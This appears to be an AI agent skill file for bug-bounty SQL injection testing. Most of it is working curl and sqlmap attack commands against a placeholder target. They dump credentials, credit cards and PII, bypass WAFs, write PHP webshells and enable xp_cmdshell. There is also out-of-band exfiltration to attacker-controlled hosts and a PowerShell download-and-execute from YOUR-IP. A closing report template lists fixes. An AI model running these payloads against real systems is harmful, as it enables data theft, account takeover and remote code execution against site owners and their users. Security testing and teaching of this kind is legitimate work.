---
name: sqli-deep-dive
description: Complete SQL Injection methodology from 305 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - sqli methodology
  - sqli deep dive
  - sql injection complete
  - sqli all techniques
  - skills sqli
---

# Complete SQL Injection Methodology - From 305 HackerOne Reports

## Step 1: Recon for SQLi Parameters
Find every parameter that touches the database.

### Automated Parameter Discovery
```bash
# Find SQLi-prone parameters from recon data
grep -E '(\?|&)(id|page|sort|order|search|q|term|filter|category|product|user|username|email|password|pass|name|title|type|status|role|group|limit|offset|count|action|method|lang|locale|debug|test|cmd|exec|run|api|token|key|secret|file|path|dir|template|theme|option|config|setting|mode|view|format|output|callback|jsonp|include|require|import|export|delete|remove|edit|update|save|create|add|get|list|show|submit|login|register|signup|reset|recover|verify|confirm|agree|subscribe|unsubscribe|contact|send|upload|download|preview|thumbnail)[=:]' recon/{target}/urls.txt | sort -u

# Use Arjun to discover hidden params
arjun -u https://{target}/api/endpoint --get -oT params_sqli.txt

# Use ParamSpider
python3 paramspider.py --domain {target} --exclude woff,css,png,svg,jpg
```

### Check Every Input Surface
For each feature below, test ALL user-controllable inputs:

| Feature | Real Report Example |
|---------|-------------------|
| Search bars | #2074326 - Starbucks search SQLi |
| GraphQL queries | #1596838 - HackerOne GraphQL SQLi |
| JSON API endpoints | #291343 - Uber JSON SQLi |
| File upload metadata | Multiple reports |
| HTTP Headers | User-Agent, X-Forwarded-For, Cookie |
| URL parameters | #1481032 - Acronis URL SQLi |
| POST body params | #1245312 - PostgreSQL via BL |
| Nested JSON params | #291343 - Uber nested JSON |
| CSV/Excel import | Multiple second-order SQLi |
| WebSocket messages | #2203188 - WebSocket SQLi |
| XML/SOAP endpoints | #66819 - report_xml.php SQLi |
| Cookie values | #2074326 - Starbucks cookie SQLi |
| API sort/order params | Time-based via ORDER BY |

## Step 2: Basic SQLi Detection

### Test 1: Error-Based Detection
```bash
# Single quote test
curl -sk "https://{target}/page?id=1'"
curl -sk "https://{target}/page?id=1%27"
curl -sk "https://{target}/page?id=1%22"

# Double quote test
curl -sk "https://{target}/page?id=1\""

# Double encoding
curl -sk "https://{target}/page?id=1%2527"

# SQL comment injection
curl -sk "https://{target}/page?id=1'--+-"
curl -sk "https://{target}/page?id=1'%23"
curl -sk "https://{target}/page?id=1'/*"

# Boolean tests
curl -sk "https://{target}/page?id=1' AND '1'='1"
curl -sk "https://{target}/page?id=1' AND '1'='2"
curl -sk "https://{target}/page?id=1' OR '1'='1"
```

### Test 2: Time-Based Detection
```bash
# MySQL
curl -sk "https://{target}/page?id=1' AND SLEEP(5)-- -"
curl -sk "https://{target}/page?id=1' AND BENCHMARK(5000000,MD5(1))-- -"

# PostgreSQL
curl -sk "https://{target}/page?id=1' AND PG_SLEEP(5)-- -"

# MSSQL
curl -sk "https://{target}/page?id=1' WAITFOR DELAY '0:0:5'-- -"

# Oracle
curl -sk "https://{target}/page?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -"
```

### Test 3: Out-of-Band (OOB) Detection
```bash
# MySQL OOB (requires secure_file_priv)
curl -sk "https://{target}/page?id=1' LOAD_FILE(concat('\\\\\\\\',(SELECT version()),'.YOUR-ID.oastify.com\\\\test'))-- -"

# MSSQL OOB via xp_cmdshell
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell('curl http://YOUR-ID.oastify.com/'+(SELECT @@version))-- -"

# Oracle OOB via UTL_HTTP
curl -sk "https://{target}/page?id=1' AND UTL_HTTP.request('http://YOUR-ID.oastify.com/'||(SELECT banner FROM v$version WHERE rownum=1))-- -"

# PostgreSQL OOB via dblink
curl -sk "https://{target}/page?id=1' AND (SELECT dblink_connect((SELECT 'hostaddr=YOUR-IP port=4444 user=test password=test dbname='||(SELECT version()))))-- -"
```

## Step 3: Database-Specific Payloads

### MySQL Payloads
```bash
# Version extraction
curl -sk "https://{target}/page?id=1' UNION SELECT @@version-- -"

# User extraction
curl -sk "https://{target}/page?id=1' UNION SELECT user()-- -"

# Database extraction
curl -sk "https://{target}/page?id=1' UNION SELECT database()-- -"

# List tables (information_schema)
curl -sk "https://{target}/page?id=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"

# List columns
curl -sk "https://{target}/page?id=1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'-- -"

# Dump data
curl -sk "https://{target}/page?id=1' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users-- -"

# Stacked queries (if supported)
curl -sk "https://{target}/page?id=1'; INSERT INTO logs VALUES('hacked')-- -"

# INTO OUTFILE (write webshell)
curl -sk "https://{target}/page?id=1' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"

# Read files with LOAD_FILE
curl -sk "https://{target}/page?id=1' UNION SELECT LOAD_FILE('/etc/passwd')-- -"

# Conditional error
curl -sk "https://{target}/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- -"
```

### PostgreSQL Payloads
```bash
# Version
curl -sk "https://{target}/page?id=1' UNION SELECT version()-- -"

# List tables
curl -sk "https://{target}/page?id=1' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'-- -"

# List columns
curl -sk "https://{target}/page?id=1' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'-- -"

# Dump data
curl -sk "https://{target}/page?id=1' UNION SELECT string_agg(username||':'||password,',') FROM users-- -"

# Stacked queries
curl -sk "https://{target}/page?id=1'; CREATE TABLE pwn(data text)-- -"

# Command execution via pg_read_file
curl -sk "https://{target}/page?id=1' UNION SELECT pg_read_file('/etc/passwd')-- -"

# Large object to read files
curl -sk "https://{target}/page?id=1' UNION SELECT lo_import('/etc/passwd')-- -"

# dblink for OOB
curl -sk "https://{target}/page?id=1' UNION SELECT dblink_connect('host=YOUR-IP user=test password=test dbname='||(SELECT password FROM users LIMIT 1))-- -"
```

### MSSQL Payloads
```bash
# Version
curl -sk "https://{target}/page?id=1' UNION SELECT @@version-- -"
curl -sk "https://{target}/page?id=1' UNION SELECT @@version-- -"

# List tables
curl -sk "https://{target}/page?id=1' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- -"

# xp_cmdshell execution
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell('whoami')-- -"

# xp_cmdshell revival (if disabled)
curl -sk "https://{target}/page?id=1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')-- -"

# Linked servers (lateral movement)
curl -sk "https://{target}/page?id=1' UNION SELECT name FROM sys.servers-- -"

# OpenQuery to linked server
curl -sk "https://{target}/page?id=1' UNION SELECT * FROM OPENQUERY(LinkedServer, 'SELECT @@version')-- -"

# Time-based
curl -sk "https://{target}/page?id=1' WAITFOR DELAY '0:0:5'-- -"

# Bulk insert file read
curl -sk "https://{target}/page?id=1'; CREATE TABLE #temp(data varchar(max)); BULK INSERT #temp FROM 'c:\inetpub\wwwroot\web.config'; SELECT * FROM #temp-- -"
```

### Oracle Payloads
```bash
# Version
curl -sk "https://{target}/page?id=1' UNION SELECT banner FROM v$version-- -"
curl -sk "https://{target}/page?id=1' UNION SELECT version FROM v$instance-- -"

# List tables
curl -sk "https://{target}/page?id=1' UNION SELECT table_name FROM all_tables-- -"
curl -sk "https://{target}/page?id=1' UNION SELECT owner||'.'||table_name FROM all_tables WHERE rownum<10-- -"

# List columns
curl -sk "https://{target}/page?id=1' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- -"

# Dump data
curl -sk "https://{target}/page?id=1' UNION SELECT username||':'||password FROM users-- -"

# Time-based
curl -sk "https://{target}/page?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -"
curl -sk "https://{target}/page?id=1' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual) IS NULL-- -"

# OOB via UTL_HTTP
curl -sk "https://{target}/page?id=1' AND UTL_HTTP.request('http://YOUR-ID.oastify.com/'||(SELECT password FROM users WHERE rownum=1))-- -"

# File read via UTL_FILE
curl -sk "https://{target}/page?id=1' UNION SELECT UTL_FILE.FREAD('/etc/passwd') FROM dual-- -"
```

### SQLite Payloads
```bash
# Version
curl -sk "https://{target}/page?id=1' UNION SELECT sqlite_version()-- -"

# List tables
curl -sk "https://{target}/page?id=1' UNION SELECT name FROM sqlite_master WHERE type='table'-- -"

# Dump schema
curl -sk "https://{target}/page?id=1' UNION SELECT sql FROM sqlite_master WHERE type='table'-- -"

# Dump data
curl -sk "https://{target}/page?id=1' UNION SELECT username||':'||password FROM users-- -"

# String concatenation
curl -sk "https://{target}/page?id=1' UNION SELECT username||'|'||password FROM users-- -"
```

## Step 4: Blind SQLi Extraction Techniques

### Boolean-Based Blind SQLi
```bash
# Determine database type (MySQL)
curl -sk "https://{target}/page?id=1' AND MID(VERSION(),1,1)='5'-- -"  # True
curl -sk "https://{target}/page?id=1' AND MID(VERSION(),1,1)='4'-- -"  # False

# Extract data character by character
for i in $(seq 1 32); do
  for c in {a..z} {0..9} {A..Z}; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}/page?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),$i,1)='$c'-- -")
    if [ "$code" == "200" ]; then
      echo "Char $i: $c"
      break
    fi
  done
done
```

### Time-Based Blind SQLi
```bash
# MySQL - extract char by char using SLEEP
for i in $(seq 1 32); do
  for c in $(echo -n "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?/"); do
    time=$(curl -sk -o /dev/null -w "%{time_total}" "https://{target}/page?id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),$i,1)='$c',SLEEP(1),0)-- -")
    if (( $(echo "$time > 0.9" | bc -l) )); then
      echo "Char $i: $c"
      break
    fi
  done
done
```

### Blind Conditional Error Technique
```bash
# MySQL - error on condition true
# True condition causes double-query error, false doesn't
curl -sk "https://{target}/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT IFNULL(CAST(SUBSTRING((SELECT password FROM users LIMIT 1),1,1) AS CHAR),0x20)),FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- -"
```

## Step 5: Advanced SQLi Vectors

### Second-Order SQLi
```bash
# Step 1: Inject payload into storage (profile, comment, etc.)
curl -sk -X POST "https://{target}/signup" -d "username=admin' UNION SELECT 1,2,3-- -&password=test123"

# Step 2: Make app retrieve stored payload in vulnerable context
curl -sk "https://{target}/profile?user=admin' UNION SELECT 1,2,3-- -"
# Payload gets executed when retrieved data is used in a SQL query

# Step 2 (alt): Trigger second function that uses stored data unsafely
curl -sk "https://{target}/reset_password?user=admin' UNION SELECT 1,2,3-- -"
```

### JSON/GraphQL SQLi
```json
// GraphQL mutation with SQLi
{
  "query": "mutation { login(username: \"admin' OR '1'='1\", password: \"test\") { token } }"
}

// GraphQL with nested injection
{
  "query": "query { users(filter: {id: \"1' UNION SELECT * FROM passwords--\"}) { name email } }"
}

// JSON POST with SQLi in nested object
POST /api/search
Content-Type: application/json

{
  "search": {
    "query": "test' OR 1=1-- -",
    "filters": {
      "category": "1' AND SLEEP(5)-- -"
    }
  }
}
```

### Cookie/Header SQLi
```bash
# Cookie injection
curl -sk -b "session=1' OR '1'='1" "https://{target}/dashboard"

# User-Agent injection (stored in DB logs)
curl -sk -H "User-Agent: 1' UNION SELECT @@version-- -" "https://{target}/"

# X-Forwarded-For injection (stored in DB)
curl -sk -H "X-Forwarded-For: 1' AND SLEEP(5)-- -" "https://{target}/"

# Referer injection
curl -sk -H "Referer: http://evil.com/1' AND SLEEP(5)-- -" "https://{target}/"

# Accept-Language injection
curl -sk -H "Accept-Language: en' OR '1'='1" "https://{target}/"
```

### NoSQL Injection (MongoDB)
```bash
# MongoDB JSON injection
curl -sk -X POST "https://{target}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# MongoDB URL parameter injection
curl -sk "https://{target}/api/users?username[$ne]=nonexistent"

# MongoDB $where injection
curl -sk "https://{target}/api/search?q=1' && this.password.length>0 || '1'=='1"

# MongoDB boolean-based
curl -sk "https://{target}/api/users?username[$regex]=^a.*&password[$ne]=x"

# MongoDB time-based (if $where supported with JS)
curl -sk "https://{target}/api/search?q=1' && sleep(5000) || '1'=='1"

# NoSQLi - extract password char by char
curl -sk "https://{target}/api/users?username[$regex]=^a.*"
curl -sk "https://{target}/api/users?username[$regex]=^b.*"
# True/false response reveals first char of username
```

## Step 6: WAF Bypass Techniques

### Case Manipulation
```bash
# MySQL is case-insensitive for strings
curl -sk "https://{target}/page?id=1' unIon SelECt 1,2,3-- -"
curl -sk "https://{target}/page?id=1' UnIoN SeLeCt @@version-- -"

# Mixed case
curl -sk "https://{target}/page?id=1' uNIoN sELecT 1,2,3-- -"
```

### Comment Padding
```bash
# Inline comments between keywords
curl -sk "https://{target}/page?id=1' UN/**/ION SEL/**/ECT 1,2,3-- -"

# Nested comments (MySQL)
curl -sk "https://{target}/page?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3-- -"

# Version-specific comments (MySQL 5.x)
curl -sk "https://{target}/page?id=1' /*!50100UNION*/ /*!50100SELECT*/ 1,2,3-- -"
```

### Encoding Bypasses
```bash
# URL encoding
curl -sk "https://{target}/page?id=1%27%20UNION%20SELECT%201%2C2%2C3--%20-"

# Double URL encoding
curl -sk "https://{target}/page?id=1%2527%20UNION%20SELECT%201%2C2%2C3--%20-"

# Unicode encoding
curl -sk "https://{target}/page?id=1\u0027\u0020UNION\u0020SELECT\u00201\u002C2\u002C3--"

# Hex encoding of strings (MySQL)
curl -sk "https://{target}/page?id=1' UNION SELECT 1,0x61646d696e,3-- -"
# 0x61646d696e = 'admin'

# CHAR() function (MySQL)
curl -sk "https://{target}/page?id=1' UNION SELECT CHAR(97,100,109,105,110)-- -"
```

### Operator Substitution
```bash
# AND -> &&
curl -sk "https://{target}/page?id=1' && SLEEP(5)-- -"

# OR -> ||
curl -sk "https://{target}/page?id=1' || SLEEP(5)-- -"

# = -> LIKE / IN / BETWEEN
curl -sk "https://{target}/page?id=1' UNION SELECT 1,2,3 WHERE 'a' LIKE 'a'-- -"
curl -sk "https://{target}/page?id=1' UNION SELECT 1,2,3 WHERE 1 IN (1)-- -"
curl -sk "https://{target}/page?id=1' UNION SELECT 1,2,3 WHERE 1 BETWEEN 0 AND 2-- -"

# SLEEP -> BENCHMARK (MySQL)
curl -sk "https://{target}/page?id=1' AND BENCHMARK(10000000,MD5(1))-- -"

# SPACE -> /**/ or +
curl -sk "https://{target}/page?id=1'/**/UNION/**/SELECT/**/1,2,3-- -"
curl -sk "https://{target}/page?id=1'+UNION+SELECT+1,2,3-- -"
```

### Blacklist Bypass
```bash
# Bypass 'OR' and 'AND' filters
curl -sk "https://{target}/page?id=1' || '1'='1"   # Use ||
curl -sk "https://{target}/page?id=1' && '1'='1"   # Use &&

# Bypass 'UNION' filter
curl -sk "https://{target}/page?id=1' UNIOUNIONN SELECT 1,2,3-- -"  # Double writing
curl -sk "https://{target}/page?id=1' UNI/**/ON SELECT 1,2,3-- -"   # Comments

# Bypass 'SELECT' filter
curl -sk "https://{target}/page?id=1' UNION SELSELECTECT 1,2,3-- -"
curl -sk "https://{target}/page?id=1' UNION SEL/**/ECT 1,2,3-- -"

# Bypass '=' filter
curl -sk "https://{target}/page?id=1' UNION SELECT 1,2,3 WHERE 'a' LIKE 'a'-- -"

# Bypass information_schema restrictions
curl -sk "https://{target}/page?id=1' UNION SELECT * FROM mysql.innodb_table_stats-- -"

# Bypass sp_ prefix filter (MSSQL)
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell 'whoami'-- -"
curl -sk "https://{target}/page?id=1'; EXEC [xp][cmdshell] 'whoami'-- -"
```

### HTTP Parameter Pollution (HPP)
```bash
# Send multiple params with same name
curl -sk "https://{target}/page?id=1&id=UNION&id=SELECT&id=1,2,3--%20-"

# Send param in both GET and POST
curl -sk -X POST "https://{target}/page?id=1" -d "id=UNION SELECT 1,2,3-- -"
```

## Step 7: Automated Exploitation with sqlmap

### Basic Usage
```bash
# Standard injection point
sqlmap -u "https://{target}/page?id=1" --batch --random-agent

# POST request
sqlmap -u "https://{target}/login" --data "username=admin&password=test" --batch

# Full request file (from Burp)
sqlmap -r request.txt --batch

# With cookies
sqlmap -u "https://{target}/page?id=1" --cookie="session=abc123" --batch

# With headers
sqlmap -u "https://{target}/page?id=1" -H "User-Agent: Mozilla/5.0" --batch
```

### Advanced sqlmap Techniques
```bash
# Dump entire DB
sqlmap -u "https://{target}/page?id=1" --dump --batch

# List databases
sqlmap -u "https://{target}/page?id=1" --dbs --batch

# Specific DB
sqlmap -u "https://{target}/page?id=1" -D target_db --tables --batch

# Specific table
sqlmap -u "https://{target}/page?id=1" -D target_db -T users --columns --batch

# Specific columns
sqlmap -u "https://{target}/page?id=1" -D target_db -T users -C username,password --dump --batch

# Second-order injection
sqlmap -u "https://{target}/page?id=1" --second-order "https://{target}/profile" --batch

# Time-based blind (slow but thorough)
sqlmap -u "https://{target}/page?id=1" --technique=T --time-sec=2 --batch

# With tamper scripts for WAF bypass
sqlmap -u "https://{target}/page?id=1" --tamper=space2comment --batch
sqlmap -u "https://{target}/page?id=1" --tamper=charencode --batch
sqlmap -u "https://{target}/page?id=1" --tamper=between --batch
sqlmap -u "https://{target}/page?id=1" --tamper=randomcase --batch
sqlmap -u "https://{target}/page?id=1" --tamper=bluecoat --batch
sqlmap -u "https://{target}/page?id=1" --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,noneedle,nonun,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,uppercase,varnish --batch

# Skip payload detection and go straight to exploitation
sqlmap -u "https://{target}/page?id=1" --no-cast --no-escape --batch

# Force DBMS
sqlmap -u "https://{target}/page?id=1" --dbms=mysql --batch
sqlmap -u "https://{target}/page?id=1" --dbms=postgresql --batch
sqlmap -u "https://{target}/page?id=1" --dbms=mssql --batch
sqlmap -u "https://{target}/page?id=1" --dbms=oracle --batch

# OS shell
sqlmap -u "https://{target}/page?id=1" --os-shell --batch

# Read files (MySQL)
sqlmap -u "https://{target}/page?id=1" --file-read="/etc/passwd" --batch

# Write webshell (MySQL)
sqlmap -u "https://{target}/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# NoSQLi
sqlmap -u "https://{target}/api/search?q=test" --dbms=mongodb --batch
```

## Step 8: SQLi Exploit Chains

### Chain 1: SQLi → Admin Account → Full Application Access
```bash
# Step 1: Dump admin credentials
sqlmap -u "https://{target}/login" --data "username=admin&password=test" \
  -D target_db -T users --dump --batch

# Step 2: Login as admin
curl -sk -X POST "https://{target}/login" -d "username=admin&password=EXTRACTED_HASH"

# Step 3: Access admin features, read all data
```

### Chain 2: SQLi → Webshell (MySQL) → RCE
```bash
# Step 1: Check if INTO OUTFILE works
curl -sk "https://{target}/page?id=1' UNION SELECT 'test' INTO OUTFILE '/tmp/test.txt'-- -"

# Step 2: Find webroot (via error messages, common paths)
# Common: /var/www/html, /var/www, /var/www/public, /usr/share/nginx/html

# Step 3: Write webshell
sqlmap -u "https://{target}/page?id=1" \
  --file-write="webshell.php" \
  --file-dest="/var/www/html/shell.php" \
  --batch

# Step 4: Access and execute commands
curl -sk "https://{target}/shell.php?cmd=id"
curl -sk "https://{target}/shell.php?cmd=cat+/etc/passwd"
```

### Chain 3: SQLi (MSSQL) → xp_cmdshell → Full RCE
```bash
# Step 1: Enable xp_cmdshell
curl -sk "https://{target}/page?id=1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -"

# Step 2: Execute commands
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell 'whoami'-- -"
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri http://YOUR-IP/shell.ps1 -OutFile C:\shell.ps1'-- -"
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell 'powershell -exec bypass -f C:\shell.ps1'-- -"

# Step 3: System access - dump SAM, move laterally
curl -sk "https://{target}/page?id=1'; EXEC xp_cmdshell 'reg save HKLM\SAM C:\sam.save'-- -"
```

### Chain 4: SQLi → AWS RDS → Cloud Compromise
```bash
# Step 1: Confirm RDS (MySQL on RDS)
curl -sk "https://{target}/page?id=1' UNION SELECT @@version-- -"

# Step 2: Dump databases (RDS usually has restrictive file_priv)
sqlmap -u "https://{target}/page?id=1" --dump --batch

# Note: RDS does NOT allow INTO OUTFILE or LOAD_FILE
# But you can still dump all data including IAM roles if stored in DB

# Step 3: Extract any AWS keys stored in application tables
sqlmap -u "https://{target}/page?id=1" \
  -D target_db --search --columns "aws" --batch
sqlmap -u "https://{target}/page?id=1" \
  -D target_db --search --columns "secret" --batch
sqlmap -u "https://{target}/page?id=1" \
  -D target_db --search --columns "key" --batch
```

### Chain 5: SQLi → PII Extraction → Account Takeover
```bash
# Step 1: Find PII-containing tables
sqlmap -u "https://{target}/page?id=1" \
  --search -C "email,password,ssn,credit_card,phone,dob,address,ssn" --batch

# Step 2: Dump user credentials
sqlmap -u "https://{target}/page?id=1" \
  -D app_db -T users \
  -C email,password_hash,credit_card \
  --dump --batch

# Step 3: Crack password hashes (if bcrypt/sha256, this may be slow)
# Or use the raw data directly for targeted attacks

# Step 4: Use credentials to login and pivot
curl -sk -X POST "https://{target}/login" -d "email=target@victim.com&password=cracked_pass"
```

## Step 9: Validate & Report

### CVSS Scoring for SQLi
```
Basic SQLi (no data extracted):      AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3 Medium
SQLi with data extraction:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
SQLi leading to RCE:                 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
SQLi with full DB takeover:          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
SQLi with PII of multiple users:     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Second-order SQLi:                   AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H → 7.7 High
```

### Report Template
```markdown
**Summary:**
SQL Injection vulnerability in [parameter] at [endpoint] allows an attacker 
to execute arbitrary SQL queries, leading to [impact].

**Impact:**
An attacker can exploit this SQLi to [extract database contents / read files / 
execute commands / take over accounts / access PII of all users].

**Steps to Reproduce:**
1. Send request to: [request]
2. Observe: [evidence of SQL injection]

**Proof of Concept:**
Request:
GET /page?id=1' UNION SELECT @@version-- - HTTP/1.1
Host: target.com

Response:
8.0.32

Database dump:
user1@example.com | $2y$10$... | John Doe | 4111-1111-1111-1111
user2@example.com | $2y$10$... | Jane Doe | 4222-2222-2222-2222

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

**Suggested Fix:**
1. Use parameterized queries / prepared statements
2. Implement strict input validation and sanitization
3. Use a WAF as defense-in-depth (not sole protection)
4. Apply the principle of least privilege for DB accounts
5. Remove/disable xp_cmdshell, UTL_HTTP, and other dangerous features
```

## SQLi Automation Script
```bash
#!/bin/bash
# Full SQLi scan for a target
TARGET=$1
PARAMS="id page sort order search q term filter category product user username email name title type status role group limit offset count action lang locale debug test file path dir view format callback"

for param in $PARAMS; do
  # Time-based detection
  time_before=$(date +%s%N)
  curl -sk -o /dev/null "https://$TARGET/page?$param=1' AND SLEEP(3)-- -" 2>/dev/null
  time_after=$(date +%s%N)
  elapsed=$(( (time_after - time_before) / 1000000 ))
  if [ "$elapsed" -ge 2500 ]; then
    echo "TIME-BASED SQLi: $param (${elapsed}ms)"
  fi

  # Error-based detection
  response=$(curl -sk "https://$TARGET/page?$param=1'" 2>/dev/null)
  if echo "$response" | grep -qiE "(sql|mysql|postgresql|ora-|driver|odbc|syntax|unclosed|quotation|warning|mysqli|pg_|sqlite|microsoft.*error|db2)"; then
    echo "ERROR-BASED SQLi: $param"
  fi

  # Boolean-based detection
  true_resp=$(curl -sk -o /dev/null -w "%{size_download}" "https://$TARGET/page?$param=1' AND '1'='1" 2>/dev/null)
  false_resp=$(curl -sk -o /dev/null -w "%{size_download}" "https://$TARGET/page?$param=1' AND '1'='2" 2>/dev/null)
  if [ "$true_resp" != "$false_resp" ]; then
    echo "BOOLEAN-BASED SQLi: $param (diff: $((true_resp - false_resp)) bytes)"
  fi
done
```

## Additional Techniques (External Sources)

### Emoji in Email Field Causing SQL Character Encoding Error Disclosure
Sending emoji or multibyte Unicode characters in input fields (especially email) can cause character encoding mismatches between the application layer (UTF-8) and the database (latin1, ASCII). This mismatch often results in SQL errors that disclose information:
```
POST /signup HTTP/1.1
Content-Type: application/json

{"email": "test😀@test.com"}
```
The database may truncate or corrupt the multibyte character, producing a SQL error like:
```
Incorrect string value: '\xF0\x9F\x98\x80' for column 'email' at row 1
```
This reveals the database type, column constraints, and potentially the query structure. More critically, the truncation can be used to bypass uniqueness constraints or inject into SQL strings when the encoding mismatch causes byte corruption.

### Injection Point is Parameter NAME Not Value (PHPlist Parameter Name SQLi)
Standard SQL injection focuses on parameter *values*, but parameter *names* can also be injection points. In PHPlist, the parameter name itself is used directly in SQL queries:
```
GET /?search[keyword]=test&search[order_by]=id HTTP/1.1
```
If the code does:
```php
$order = $_GET['search']['order_by'];
$query = "SELECT * FROM items ORDER BY $order";
```
Then the injection point is the parameter *name* (not the value):
```
GET /?search[keyword]=test&search[order_by]=CASE WHEN ... THEN ... END HTTP/1.1
```
Or even more directly:
```
GET /?search[keyword]=test&search[0; DROP TABLE users; --]=x HTTP/1.1
```
The parameter name `0; DROP TABLE users; --` is injected directly into the SQL string.

### SOLR Injection (via \ or Dismax Query Syntax)
Apache Solr has its own query syntax that can be injected. Test with:
- Backslash injection to escape Solr special characters and break queries:
  ```
  /solr/select?q=field:\value\
  ```
- Dismax/Edismax query parameter injection via `qq`, `qf`, `pf` parameters:
  ```
  /solr/select?q=test&defType=dismax&qf=*&qq=*:*
  ```
- Solr's parameter dereferencing (`${param}`) for RCE/SSRF:
  ```
  /solr/select?q=test&debug=params&param.other=http://internal/
  ```
- Solr admin UI injection exposing core configuration, schema, and data

## Quick Reference: Top SQLi Reports by Payout/Votes
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #2074326 | Starbucks | SQLi extracting enterprise DB | (790 upvotes) |
| #1148136 | city-mobil.ru | Time-based blind SQLi | $15,000 |
| #66819 | Uber | report_xml.php SQLi | $25,000 |
| #1596838 | HackerOne | GraphQL SQLi | (172 upvotes) |
| #1245312 | Acronis | TrueDocs PostgreSQL blind | (high severity) |
| #1481032 | Acronis | SQLi in Cyber Protect | (high severity) |
| #291343 | Uber | Nested JSON SQLi | (critical) |
| #463411 | Mail.ru | Second-order SQLi | $5,000 |
| #2203188 | WebSocket | WebSocket SQLi | (critical) |

## Advanced SQLi Techniques (Merged from External Skills)

### 1. Android SQL Injection
- ContentProvider testing via ADB: `adb shell content query --uri content://provider/table`
- Static analysis of APK with jadx: grep for `rawQuery`/`execSQL` without parameterization
- SQLite-specific payloads: `ATTACH DATABASE`, heavy recursion for time-based
- Drozer for ContentProvider probing
- Frida/Objection for cert pin bypass

### 2. GraphQL SQL Injection
- Inject in argument values: `{ user(id: "1 UNION SELECT...") }`
- Alias injection to bypass field restrictions
- Fragment injection
- Variable injection
- Batch query abuse with JSON array body

### 3. NoSQL Injection (MongoDB focus)
- Operator injection: `$ne`, `$gt`, `$regex`, `$where`
- Blind extraction via regex character-by-character
- URL-encoded operator injection in GET params
- Timing attacks via `$where`
- Array injection
- Aggregation pipeline injection
- ReDoS-style delay oracle
- Also Redis CRLF injection and Cassandra (CQL) injection

### 4. WAF Bypass Techniques
- Cloudflare specific: versioned comments
- ModSecurity, Akamai, Imperva/Incapsula
- Chunked Transfer-Encoding bypass
- Base64 `FROM_BASE64` bypass (MySQL)
- JSON/XML function obfuscation: `json_extract`, `FOR XML PATH`
- sqlmap tamper script combos
- ghauri native bypass

### 5. OOB / OAST DNS and HTTP Data Exfiltration
- MySQL: `LOAD_FILE` DNS
- MSSQL: `xp_dirtree` DNS
- PostgreSQL: `COPY TO PROGRAM`
- Oracle: `UTL_HTTP`
- Unique subdomain per parameter for precise tracking

### 6. Second-Order SQLi Methodology
- Store payload in registration/profile/fields
- Trigger via admin action, password reset, search by stored value
- Source code patterns for vulnerability

### 7. SQLite Specific
- No native SLEEP — use `WITH RECURSIVE` heavy query for time-based
- Schema extraction from `sqlite_master`
- `ATTACH DATABASE` for file-based injection

### 8. Header Injection
Comprehensive test list: `X-Forwarded-For`, `X-Real-IP`, `Referer`, `User-Agent`, `Cookie`, `Accept-Language`, `X-Request-ID` (logging → 2nd order), `Authorization Bearer`

### 9. False Positive Elimination
- Boolean proof: `AND 1=1` vs `AND 1=2`
- Time proof: consistent proportional delay
